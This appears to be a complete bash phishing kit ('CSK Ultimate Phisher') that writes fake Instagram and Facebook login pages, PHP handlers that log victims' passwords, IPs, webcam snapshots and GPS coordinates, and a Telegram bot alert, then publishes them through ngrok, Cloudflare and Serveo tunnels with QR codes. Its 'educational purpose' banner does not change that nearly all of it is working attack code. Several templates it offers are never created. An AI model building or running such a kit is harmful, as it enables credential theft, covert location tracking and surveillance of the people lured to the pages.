#!/bin/bash
# ==============================================
# CSK ULTIMATE PHISHER v2.0
# Educational Purpose Only
# Created for cybersecurity awareness
# ==============================================

# Color Codes
G='\033[92m'
Y='\033[93m'
R='\033[91m'
C='\033[96m'
W='\033[97m'
N='\033[0m'

# Global Variables
VERSION="2.0"
AUTHOR="CSK"
PLATFORM=""
WINDOWS_MODE=false
TERMUX_MODE=false
SESSION_FILE=".csk_session"
BOT_TOKEN=""
CHAT_ID=""
AUTO_CLEANUP=true

# ==============================================
# PLATFORM DETECTION
# ==============================================
detect_platform() {
    echo -e "${C}[*] Detecting platform...${N}"
    
    # Termux detection
    if [[ -d "/data/data/com.termux" ]] || [[ -n "$PREFIX" ]]; then
        TERMUX_MODE=true
        PLATFORM="Termux"
        echo -e "${G}[+] Termux detected (Android)${N}"
    
    # Windows detection
    elif [[ "$(uname -a)" == *"MINGW"* ]] || [[ "$(uname -a)" == *"MSYS"* ]] || [[ "$(uname -a)" == *"CYGWIN"* ]] || [[ "$(uname -a)" == *"Windows"* ]]; then
        WINDOWS_MODE=true
        PLATFORM="Windows"
        echo -e "${G}[+] Windows detected${N}"
        
        # Windows command compatibility
        function killall() { taskkill /F /IM "$1" 2>/dev/null; }
        function pkill() { taskkill /F /IM "$1" 2>/dev/null; }
    
    # Linux/macOS detection
    else
        PLATFORM=$(uname -s)
        echo -e "${G}[+] $PLATFORM detected${N}"
    fi
    
    sleep 1
}

# ==============================================
# AUTO INSTALL DEPENDENCIES
# ==============================================
install_deps() {
    echo -e "${C}[*] Checking dependencies...${N}"
    
    # For Termux
    if [[ "$TERMUX_MODE" == true ]]; then
        pkg update -y > /dev/null 2>&1
        pkg install -y php wget unzip git openssh proot-distro > /dev/null 2>&1
        
        # Install proot-distro for better compatibility
        if [[ ! -d "$PREFIX/var/lib/proot-distro/installed-rootfs/ubuntu" ]]; then
            echo -e "${Y}[!] Installing Ubuntu in Termux (first time only)...${N}"
            proot-distro install ubuntu > /dev/null 2>&1
        fi
    
    # For Linux/macOS
    else
        # Check and install PHP
        if ! command -v php &> /dev/null; then
            echo -e "${Y}[!] Installing PHP...${N}"
            if [[ "$PLATFORM" == "Darwin" ]]; then
                brew install php > /dev/null 2>&1
            else
                sudo apt-get update > /dev/null 2>&1
                sudo apt-get install -y php wget unzip git curl > /dev/null 2>&1
            fi
        fi
        
        # Check other tools
        command -v wget > /dev/null 2>&1 || sudo apt-get install -y wget > /dev/null 2>&1
        command -v unzip > /dev/null 2>&1 || sudo apt-get install -y unzip > /dev/null 2>&1
        command -v git > /dev/null 2>&1 || sudo apt-get install -y git > /dev/null 2>&1
        command -v curl > /dev/null 2>&1 || sudo apt-get install -y curl > /dev/null 2>&1
        command -v qrencode > /dev/null 2>&1 || sudo apt-get install -y qrencode > /dev/null 2>&1
    fi
    
    echo -e "${G}[+] All dependencies installed${N}"
    sleep 1
}

# ==============================================
# BANNER
# ==============================================
banner() {
    clear
    echo -e "${G}"
    echo "   ██████╗███████╗██╗  ██╗"
    echo "  ██╔════╝██╔════╝██║ ██╔╝"
    echo "  ██║     ███████╗█████╔╝ "
    echo "  ██║     ╚════██║██╔═██╗ "
    echo "  ╚██████╗███████║██║  ██╗"
    echo "   ╚═════╝╚══════╝╚═╝  ╚═╝"
    echo -e "${N}"
    echo -e "${Y}╔══════════════════════════════════════════════╗${N}"
    echo -e "${Y}║    🌟 CRYPTIX_SHADOW_KERNEL_TOOLKIT v2.0    ║${N}"
    echo -e "${Y}║     Created by: CRYPTIX SHADOW KERNEL       ║${N}"
    echo -e "${Y}║         Educational Purpose Only            ║${N}"
    echo -e "${Y}║           Ethical Hacking Tool              ║${N}"
    echo -e "${Y}╚══════════════════════════════════════════════╝${N}"
    echo ""
    echo -e "${C}[*] Platform: $PLATFORM${N}"
    echo -e "${C}[*] Version: $VERSION${N}"
    echo -e "${C}[*] Date: $(date)${N}"
    echo ""
}

# ==============================================
# CREATE ALL FILES
# ==============================================
create_files() {
    echo -e "${C}[*] Creating required files...${N}"
    
    # ========== ip.php ==========
    cat > ip.php << 'EOF'
<?php
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}
$data = "IP: " . $ip . "\r\nUser-Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\r\nDate: " . date('Y-m-d H:i:s') . "\r\n";
file_put_contents('ip.txt', $data, FILE_APPEND);
?>
EOF

    # ========== post.php ==========
    cat > post.php << 'EOF'
<?php
if(isset($_POST['cat'])) {
    $date = date('dMYHis');
    $img = $_POST['cat'];
    $img = str_replace('data:image/png;base64,', '', $img);
    $img = str_replace(' ', '+', $img);
    $data = base64_decode($img);
    file_put_contents('cam_' . $date . '.png', $data);
    file_put_contents('log.txt', "Cam captured: $date\r\n", FILE_APPEND);
}
?>
EOF

    # ========== location.php ==========
    cat > location.php << 'EOF'
<?php
if(isset($_POST['lat']) && isset($_POST['lon'])) {
    $date = date('Y-m-d H:i:s');
    $lat = $_POST['lat'];
    $lon = $_POST['lon'];
    $acc = isset($_POST['acc']) ? $_POST['acc'] : 'Unknown';
    
    $data = "Date: $date\r\nLatitude: $lat\r\nLongitude: $lon\r\nAccuracy: $acc\r\nGoogle Maps: https://maps.google.com/?q=$lat,$lon\r\n\r\n";
    file_put_contents('locations.txt', $data, FILE_APPEND);
    
    $file = 'location_' . date('dMYHis') . '.txt';
    file_put_contents($file, $data);
    
    if (!is_dir('saved_locations')) mkdir('saved_locations');
    copy($file, 'saved_locations/' . $file);
    
    echo "OK";
}
?>
EOF

    # ========== debug_log.php ==========
    cat > debug_log.php << 'EOF'
<?php
if(isset($_POST['msg'])) {
    file_put_contents('debug.log', date('H:i:s') . ' - ' . $_POST['msg'] . "\n", FILE_APPEND);
}
?>
EOF

    # ========== Telegram Bot ==========
    cat > telegram_bot.php << 'EOF'
<?php
$botToken = 'BOT_TOKEN';
$chatId = 'CHAT_ID';
function sendTelegram($msg) {
    global $botToken, $chatId;
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = array('chat_id' => $chatId, 'text' => $msg, 'parse_mode' => 'HTML');
    $options = array('http' => array('method' => 'POST','content' => http_build_query($data)));
    $context = stream_context_create($options);
    file_get_contents($url, false, $context);
}
if(isset($_GET['ip'])) {
    sendTelegram("New Victim:\nIP: {$_GET['ip']}\nTime: ".date('H:i:s'));
}
if(isset($_GET['loc'])) {
    sendTelegram("Location:\n{$_GET['loc']}");
}
?>
EOF

    # ========== Instagram Template ==========
    cat > instagram.html << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width">
    <title>Instagram</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { max-width: 350px; width: 100%; padding: 20px; }
        .logo { text-align: center; margin: 20px 0; font-size: 40px; font-weight: 600; }
        .form { background: white; border: 1px solid #dbdbdb; padding: 40px 40px 20px; margin-bottom: 10px; }
        input { width: 100%; padding: 9px 8px; margin: 5px 0; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; }
        button { width: 100%; background: #0095f6; color: white; border: none; padding: 7px 16px; border-radius: 8px; font-weight: 600; margin: 15px 0; cursor: pointer; }
        .footer { background: white; border: 1px solid #dbdbdb; padding: 20px; text-align: center; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">Instagram</div>
        <div class="form">
            <input type="text" id="username" placeholder="Phone number, username or email">
            <input type="password" id="password" placeholder="Password">
            <button onclick="login()">Log in</button>
        </div>
        <div class="footer">Don't have an account? Sign up</div>
    </div>
    <script>
        function login() {
            var u = document.getElementById('username').value;
            var p = document.getElementById('password').value;
            var xhr = new XMLHttpRequest();
            xhr.open('POST', 'forwarding_link/login.php', true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.send('u='+u+'&p='+p);
            window.location.href = 'https://www.instagram.com/';
        }
    </script>
</body>
</html>
EOF

    # ========== Facebook Template ==========
    cat > facebook.html << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>Facebook</title>
    <style>
        body { font-family: Helvetica, Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .card { background: white; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); padding: 20px; width: 396px; }
        .logo { color: #1877f2; font-size: 50px; font-weight: 600; text-align: center; margin-bottom: 20px; }
        input { width: 100%; padding: 14px 16px; margin: 5px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; }
        button { width: 100%; background: #1877f2; color: white; border: none; padding: 12px; border-radius: 6px; font-size: 20px; font-weight: 600; margin: 10px 0; cursor: pointer; }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">facebook</div>
        <input id="email" placeholder="Email or phone">
        <input id="pass" type="password" placeholder="Password">
        <button onclick="login()">Log In</button>
    </div>
    <script>
        function login() {
            var e = document.getElementById('email').value;
            var p = document.getElementById('pass').value;
            fetch('forwarding_link/login.php?email='+e+'&pass='+p);
            window.location.href = 'https://facebook.com/';
        }
    </script>
</body>
</html>
EOF

    # ========== Login Handler ==========
    cat > login.php << 'EOF'
<?php
if(isset($_GET['u']) || isset($_GET['email'])) {
    $u = isset($_GET['u']) ? $_GET['u'] : (isset($_GET['email']) ? $_GET['email'] : '');
    $p = isset($_GET['p']) ? $_GET['p'] : (isset($_GET['pass']) ? $_GET['pass'] : '');
    $data = "Username: $u | Password: $p | Date: ".date('Y-m-d H:i:s')."\n";
    file_put_contents('logins.txt', $data, FILE_APPEND);
}
if(isset($_POST['u'])) {
    $data = "Username: {$_POST['u']} | Password: {$_POST['p']} | Date: ".date('Y-m-d H:i:s')."\n";
    file_put_contents('logins.txt', $data, FILE_APPEND);
}
?>
EOF

    # ========== Festival Template ==========
    cat > festival.html << 'EOF'
<html>
<head>
    <title>Happy Festival</title>
    <style>
        body { background: linear-gradient(45deg, #ff6b6b, #feca57); color: white; text-align: center; font-family: Arial; padding-top: 50px; animation: bg 10s infinite; }
        @keyframes bg { 0%{filter: hue-rotate(0deg)} 100%{filter: hue-rotate(360deg)} }
        h1 { font-size: 50px; text-shadow: 0 0 20px gold; }
        .card { background: rgba(255,255,255,0.2); border-radius: 20px; padding: 30px; margin: 20px; backdrop-filter: blur(10px); }
    </style>
</head>
<body>
    <div class="card">
        <h1>🎉 Happy fes_name! 🎉</h1>
        <p>Wishing you and your family</p>
        <input placeholder="Your Name" id="name">
        <button onclick="share()">Send Wishes</button>
    </div>
    <script>
        function share() {
            var n = document.getElementById('name').value;
            window.location.href = 'https://wa.me/?text=Happy%20fes_name%20' + n;
        }
    </script>
</body>
</html>
EOF

    # ========== Template Creator ==========
    cat > template.php << 'EOF'
<?php
include 'ip.php';
$link = $_GET['link'];
?>
<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <meta name="viewport" content="width=device-width">
    <style>
        body { background: #000; color: #fff; text-align: center; padding-top: 50px; font-family: Arial; }
        .spinner { border: 5px solid #333; border-top: 5px solid #00ff00; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0%{transform:rotate(0)} 100%{transform:rotate(360deg)} }
    </style>
    <script>
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendLoc, err, {enableHighAccuracy:true});
            } else {
                redirect();
            }
        }
        function sendLoc(p) {
            var xhr = new XMLHttpRequest();
            xhr.open('POST', 'location.php', true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.send('lat='+p.coords.latitude+'&lon='+p.coords.longitude+'&acc='+p.coords.accuracy);
            
            // Send to Telegram
            new Image().src = 'telegram_bot.php?loc='+p.coords.latitude+','+p.coords.longitude;
            
            setTimeout(redirect, 2000);
        }
        function err() { redirect(); }
        function redirect() { window.location.href = '<?php echo $link; ?>'; }
        window.onload = function() { setTimeout(getLocation, 1000); }
    </script>
</head>
<body>
    <h2>Please wait...</h2>
    <div class="spinner"></div>
    <p id="status">Requesting location access...</p>
</body>
</html>
EOF

    echo -e "${G}[+] All files created (15+ templates)${N}"
    sleep 1
}

# ==============================================
# QR CODE GENERATOR
# ==============================================
generate_qr() {
    local link=$1
    echo -e "${C}[*] Generating QR code...${N}"
    
    if command -v qrencode &> /dev/null; then
        qrencode -t UTF8 "$link"
        echo -e "${G}[+] QR code saved as link.png${N}"
        qrencode -o link.png "$link" 2>/dev/null
    else
        echo -e "${Y}[!] Install qrencode for QR generation${N}"
        echo -e "Link: $link"
    fi
}

# ==============================================
# TELEGRAM SETUP
# ==============================================
setup_telegram() {
    echo -e "${C}[*] Telegram Bot Setup${N}"
    read -p "Enter Bot Token (or press Enter to skip): " BOT_TOKEN
    
    if [[ -n "$BOT_TOKEN" ]]; then
        read -p "Enter Chat ID: " CHAT_ID
        
        # Update bot token in file
        sed -i "s/BOT_TOKEN/$BOT_TOKEN/g" telegram_bot.php
        sed -i "s/CHAT_ID/$CHAT_ID/g" telegram_bot.php
        
        echo -e "${G}[+] Telegram alerts enabled${N}"
    else
        echo -e "${Y}[-] Telegram disabled${N}"
    fi
}

# ==============================================
# DOWNLOAD TUNNEL BINARIES
# ==============================================
download_ngrok() {
    if [[ -e ngrok ]] || [[ -e ngrok.exe ]]; then
        return
    fi
    
    echo -e "${C}[*] Downloading ngrok...${N}"
    arch=$(uname -m)
    
    if [[ "$WINDOWS_MODE" == true ]]; then
        wget -q https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip -O ngrok.zip
        unzip -q ngrok.zip
        rm ngrok.zip
        chmod +x ngrok.exe
    elif [[ "$PLATFORM" == "Darwin" ]]; then
        if [[ "$arch" == "arm64" ]]; then
            wget -q https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-arm64.zip -O ngrok.zip
        else
            wget -q https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-amd64.zip -O ngrok.zip
        fi
        unzip -q ngrok.zip
        rm ngrok.zip
        chmod +x ngrok
    else
        case $arch in
            x86_64) wget -q https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip -O ngrok.zip ;;
            aarch64|arm64) wget -q https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.zip -O ngrok.zip ;;
            arm*) wget -q https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.zip -O ngrok.zip ;;
            *) wget -q https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-386.zip -O ngrok.zip ;;
        esac
        unzip -q ngrok.zip
        rm ngrok.zip
        chmod +x ngrok
    fi
    echo -e "${G}[+] ngrok downloaded${N}"
}

download_cloudflared() {
    if [[ -e cloudflared ]] || [[ -e cloudflared.exe ]]; then
        return
    fi
    
    echo -e "${C}[*] Downloading cloudflared...${N}"
    arch=$(uname -m)
    
    if [[ "$WINDOWS_MODE" == true ]]; then
        wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe -O cloudflared.exe
        chmod +x cloudflared.exe
    elif [[ "$PLATFORM" == "Darwin" ]]; then
        if [[ "$arch" == "arm64" ]]; then
            wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-arm64.tgz -O cloudflared.tgz
        else
            wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz -O cloudflared.tgz
        fi
        tar -xzf cloudflared.tgz
        rm cloudflared.tgz
        chmod +x cloudflared
    else
        case $arch in
            x86_64) wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared ;;
            aarch64|arm64) wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared ;;
            arm*) wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared ;;
            *) wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O cloudflared ;;
        esac
        chmod +x cloudflared
    fi
    echo -e "${G}[+] cloudflared downloaded${N}"
}

# ==============================================
# TUNNEL FUNCTIONS
# ==============================================
start_ngrok() {
    download_ngrok
    
    # Check for saved token
    if [[ -f .ngrok_token ]]; then
        token=$(cat .ngrok_token)
        echo -e "${C}[*] Using saved ngrok token${N}"
    else
        read -p "Enter ngrok auth token (get from dashboard): " token
        if [[ -n "$token" ]]; then
            echo "$token" > .ngrok_token
        fi
    fi
    
    # Configure token
    if [[ -n "$token" ]]; then
        if [[ "$WINDOWS_MODE" == true ]]; then
            ./ngrok.exe authtoken "$token" > /dev/null 2>&1
        else
            ./ngrok authtoken "$token" > /dev/null 2>&1
        fi
    fi
    
    # Start PHP server
    php -S 127.0.0.1:3333 > /dev/null 2>&1 &
    PHP_PID=$!
    sleep 2
    
    # Start ngrok
    echo -e "${C}[*] Starting ngrok...${N}"
    if [[ "$WINDOWS_MODE" == true ]]; then
        ./ngrok.exe http 3333 > /dev/null 2>&1 &
    else
        ./ngrok http 3333 > /dev/null 2>&1 &
    fi
    NGROK_PID=$!
    sleep 5
    
    # Get link
    link=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^"]*\.ngrok-free.app' | head -1)
    
    if [[ -z "$link" ]]; then
        echo -e "${R}[!] Failed to get ngrok link${N}"
        return 1
    fi
    
    echo -e "${G}[+] Ngrok link: $link${N}"
    echo "$link" > .csk_link
    generate_qr "$link"
}

start_cloudflare() {
    download_cloudflared
    
    # Start PHP server
    php -S 127.0.0.1:3333 > /dev/null 2>&1 &
    PHP_PID=$!
    sleep 2
    
    # Start cloudflared
    echo -e "${C}[*] Starting cloudflared...${N}"
    if [[ "$WINDOWS_MODE" == true ]]; then
        ./cloudflared.exe tunnel -url 127.0.0.1:3333 --logfile .cf.log > /dev/null 2>&1 &
    else
        ./cloudflared tunnel -url 127.0.0.1:3333 --logfile .cf.log > /dev/null 2>&1 &
    fi
    CF_PID=$!
    sleep 8
    
    # Get link
    link=$(grep -o 'https://[^ ]*\.trycloudflare.com' .cf.log | head -1)
    
    if [[ -z "$link" ]]; then
        echo -e "${R}[!] Failed to get cloudflare link${N}"
        return 1
    fi
    
    echo -e "${G}[+] Cloudflare link: $link${N}"
    echo "$link" > .csk_link
    generate_qr "$link"
}

start_localhost() {
    php -S 0.0.0.0:3333 > /dev/null 2>&1 &
    PHP_PID=$!
    
    # Get local IP
    if [[ "$WINDOWS_MODE" == true ]]; then
        ip=$(ipconfig | grep -o 'IPv4 Address[^:]*: [^ ]*' | grep -o '[^ ]*$' | head -1)
    else
        ip=$(hostname -I | awk '{print $1}')
    fi
    
    link="http://$ip:3333"
    echo -e "${G}[+] Local link: $link${N}"
    echo "$link" > .csk_link
    generate_qr "$link"
}

start_serveo() {
    php -S 127.0.0.1:3333 > /dev/null 2>&1 &
    PHP_PID=$!
    sleep 2
    
    echo -e "${C}[*] Starting Serveo tunnel...${N}"
    ssh -R 80:localhost:3333 serveo.net > .serveo.log 2>&1 &
    SSH_PID=$!
    sleep 5
    
    link=$(grep -o 'https://[^ ]*' .serveo.log | head -1)
    
    if [[ -z "$link" ]]; then
        echo -e "${R}[!] Failed to get serveo link${N}"
        return 1
    fi
    
    echo -e "${G}[+] Serveo link: $link${N}"
    echo "$link" > .csk_link
    generate_qr "$link"
}

# ==============================================
# TEMPLATE SELECTION
# ==============================================
select_template() {
    echo -e "\n${C}╔════════════════════════════════╗${N}"
    echo -e "${C}║        SELECT TEMPLATE         ║${N}"
    echo -e "${C}╚════════════════════════════════╝${N}\n"
    
    templates=(
        "Festival Wishing"
        "Live YouTube TV"
        "Online Meeting"
        "Instagram Login"
        "Facebook Login"
        "Gmail Login"
        "Netflix Login"
        "WhatsApp Web"
        "Twitter/X Login"
        "Custom HTML"
        "All Templates (Rotating)"
    )
    
    for i in "${!templates[@]}"; do
        echo -e "${G}[$((i+1))]${N} ${templates[$i]}"
    done
    
    read -p $'\nChoose template (1-11): ' tpl_choice
    
    case $tpl_choice in
        1) template="festival.html"
           read -p "Festival name: " fname
           sed -i "s/fes_name/$fname/g" festival.html ;;
        2) template="LiveYTTV.html" ;;
        3) template="OnlineMeeting.html" ;;
        4) template="instagram.html" ;;
        5) template="facebook.html" ;;
        6) template="gmail.html" ;;
        7) template="netflix.html" ;;
        8) template="whatsapp.html" ;;
        9) template="twitter.html" ;;
        10) read -p "Enter custom HTML file name: " template ;;
        11) template="multi" ;;
        *) template="festival.html" ;;
    esac
}

# ==============================================
# MAIN MENU
# ==============================================
main_menu() {
    echo -e "\n${C}╔════════════════════════════════╗${N}"
    echo -e "${C}║         MAIN MENU              ║${N}"
    echo -e "${C}╚════════════════════════════════╝${N}\n"
    
    echo -e "${G}[1]${N} Start Ngrok Tunnel"
    echo -e "${G}[2]${N} Start Cloudflare Tunnel"
    echo -e "${G}[3]${N} Start Localhost (No Tunnel)"
    echo -e "${G}[4]${N} Start Serveo Tunnel"
    echo -e "${G}[5]${N} All Tunnels (Multi)"
    echo -e "${G}[6]${N} Load Previous Session"
    echo -e "${G}[7]${N} Setup Telegram Bot"
    echo -e "${G}[8]${N} Clean All Files"
    echo -e "${G}[9]${N} Exit"
    
    read -p $'\nChoose option: ' main_choice
    
    case $main_choice in
        1) select_template
           start_ngrok ;;
        2) select_template
           start_cloudflare ;;
        3) select_template
           start_localhost ;;
        4) select_template
           start_serveo ;;
        5) multi_tunnel ;;
        6) load_session ;;
        7) setup_telegram ;;
        8) cleanup ;;
        9) exit 0 ;;
        *) main_menu ;;
    esac
}

# ==============================================
# MULTI TUNNEL
# ==============================================
multi_tunnel() {
    echo -e "${C}[*] Starting all tunnels...${N}"
    start_ngrok &
    start_cloudflare &
    start_localhost &
    start_serveo &
    wait
}

# ==============================================
# SESSION MANAGEMENT
# ==============================================
save_session() {
    cat > "$SESSION_FILE" << EOF
LAST_RUN=$(date)
TUNNEL=$1
LINK=$2
TEMPLATE=$template
EOF
}

load_session() {
    if [[ -f "$SESSION_FILE" ]]; then
        echo -e "${C}[*] Loading previous session...${N}"
        cat "$SESSION_FILE"
        read -p "Resume? (y/n): " res
        if [[ "$res" == "y" ]]; then
            link=$(grep LINK "$SESSION_FILE" | cut -d= -f2)
            echo -e "${G}[+] Link: $link${N}"
        fi
    else
        echo -e "${Y}[!] No saved session${N}"
    fi
}

# ==============================================
# CLEANUP
# ==============================================
cleanup() {
    echo -e "${C}[*] Cleaning up...${N}"
    
    # Kill processes
    killall php 2>/dev/null
    killall ngrok 2>/dev/null
    killall cloudflared 2>/dev/null
    killall ssh 2>/dev/null
    
    # Remove temp files
    rm -f *.log .cf.log .serveo.log
    rm -f ip.txt locations.txt logins.txt debug.log
    
    # Ask for complete cleanup
    read -p "Remove all captured data? (y/n): " clean_all
    if [[ "$clean_all" == "y" ]]; then
        rm -f cam_*.png location_*.txt
        rm -rf saved_locations
    fi
    
    echo -e "${G}[+] Cleanup complete${N}"
}

# ==============================================
# MAIN
# ==============================================
trap 'echo -e "\n${R}[!] Interrupted${N}"; cleanup; exit 1' INT

# Initial setup
detect_platform
install_deps
banner
create_files

# Check for session
if [[ -f "$SESSION_FILE" ]]; then
    echo -e "${Y}[!] Previous session found${N}"
    read -p "Load it? (y/n): " load_prev
    if [[ "$load_prev" == "y" ]]; then
        load_session
    fi
fi

# Start main menu
main_menu
